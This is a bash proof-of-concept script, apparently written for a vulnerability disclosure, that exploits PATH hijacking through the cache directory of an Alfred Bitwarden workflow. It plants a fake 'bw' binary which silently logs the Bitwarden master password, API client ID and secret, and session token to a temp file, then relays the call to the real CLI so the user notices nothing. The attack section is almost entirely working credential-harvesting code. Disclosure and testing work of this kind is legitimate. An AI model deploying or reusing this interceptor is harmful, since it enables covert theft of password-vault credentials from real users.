#!/bin/bash
# ============================================================
# PoC #4 — PATH Hijacking via Cache Directory Prepend (CRITICAL)
# Vulnerability: lib/env.sh:10
#
#   export PATH="${alfred_workflow_cache}":${PATH}
#
# The Alfred workflow cache directory is prepended to PATH before any
# scripts run.  An attacker who can write a file named `bw` (or `curl`,
# `jq`, etc.) to that directory will have their binary executed instead
# of the real Bitwarden CLI on the next workflow invocation.
#
# This PoC demonstrates:
#   A) Locating the cache directory
#   B) Dropping a fake `bw` interceptor that logs all arguments and
#      credentials, then delegates to the real binary (transparent relay)
#   C) Showing that the interceptor receives the master password via the
#      PASS environment variable during login
#   D) Cleanup
# ============================================================

# Resolve the cache directory the same way Alfred does.
# On a live Alfred install this is set by Alfred itself; we simulate it.
BUNDLE_ID="${alfred_workflow_bundleid:-com.example.bitwarden-accelerator}"
CACHE_DIR="${alfred_workflow_cache:-${HOME}/Library/Caches/com.runningwithcrayons.Alfred/Workflow Data/${BUNDLE_ID}}"

FAKE_BW="${CACHE_DIR}/bw"
INTERCEPT_LOG="/tmp/bw_intercept_$$.log"

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }

# ---------- Part A: Locate the cache ----------
banner "Part A — Locate the writable cache directory"

info "Resolved cache path: ${CACHE_DIR}"

if [ -d "${CACHE_DIR}" ]; then
    ok "Cache directory exists and is writable by current user."
    ls -la "${CACHE_DIR}" | head -10
else
    info "Cache directory does not exist yet — creating for simulation."
    mkdir -p "${CACHE_DIR}"
    ok "Created: ${CACHE_DIR}"
fi

# ---------- Part B: Drop a fake `bw` interceptor ----------
banner "Part B — Deploy credential-harvesting fake 'bw' binary"

info "Writing interceptor to ${FAKE_BW}"

cat > "${FAKE_BW}" << 'INTERCEPTOR'
#!/bin/bash
# Fake `bw` — transparent relay that logs all invocations

LOG="/tmp/bw_intercept.log"

{
    echo "===== $(date) ====="
    echo "ARGS: $*"
    echo "ENV (credential-related):"
    echo "  PASS=${PASS}"
    echo "  BW_CLIENTID=${BW_CLIENTID}"
    echo "  BW_CLIENTSECRET=${BW_CLIENTSECRET}"
    echo "  BW_SESSION=${BW_SESSION}"
    echo ""
} >> "${LOG}"

# Delegate to the real bw so the workflow continues to work normally
# (transparent — victim does not notice anything)
exec /usr/local/bin/bw "$@"
INTERCEPTOR

chmod +x "${FAKE_BW}"
ok "Fake bw installed at ${FAKE_BW}"
ok "Intercept log will be written to /tmp/bw_intercept.log"

# ---------- Part C: Demonstrate the PATH resolution ----------
banner "Part C — Verify fake binary shadows the real one"

# Simulate the PATH manipulation from env.sh:10
ORIGINAL_BW=$(command -v bw 2>/dev/null || echo "/usr/local/bin/bw (not found in PATH)")
info "Real bw location: ${ORIGINAL_BW}"

# Apply the vulnerable PATH modification
export PATH="${CACHE_DIR}:${PATH}"
RESOLVED_BW=$(command -v bw 2>/dev/null)

info "PATH after env.sh modification: ${CACHE_DIR}:..."
info "bw resolves to: ${RESOLVED_BW}"

if [ "${RESOLVED_BW}" == "${FAKE_BW}" ]; then
    ok "CONFIRMED: fake bw shadows the real binary."
    ok "Any subsequent call to 'bw' in the workflow uses the interceptor."
else
    info "Real bw not installed; PATH shadowing would work if bw were present."
    info "Resolved to: ${RESOLVED_BW}"
fi

# ---------- Simulate a login invocation ----------
banner "Part C (continued) — Simulate login with credential capture"

info "Simulating: export PASS='SuperSecretMasterPassword'; bw login user@example.com --passwordenv PASS"
export PASS='SuperSecretMasterPassword'
export BW_SESSION='eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.SIMULATED'

# Call the fake bw directly (mimicking what login.sh does)
if [ -x "${FAKE_BW}" ]; then
    "${FAKE_BW}" --response --nointeraction login "user@example.com" --passwordenv PASS \
        > /dev/null 2>&1 || true
    echo
    ok "Interceptor captured the following from /tmp/bw_intercept.log:"
    cat /tmp/bw_intercept.log 2>/dev/null || echo "(log not yet written — real bw not present)"
fi

# ---------- Part D: Cleanup ----------
banner "Part D — Cleanup"

rm -f "${FAKE_BW}"
rm -f /tmp/bw_intercept.log
ok "Fake binary and log removed."

echo
echo "RESULT: Any process that can write to \${alfred_workflow_cache} can silently"
echo "        intercept every bw CLI call, including login credentials passed via"
echo "        the PASS environment variable, API keys, and session tokens."
echo
echo "        Attack vectors for writing to the cache directory:"
echo "          - Another Alfred workflow (they share the same user context)"
echo "          - Any app running as the same macOS user"
echo "          - A malicious file downloaded and executed by the user"
echo "          - A path traversal in another workflow component"
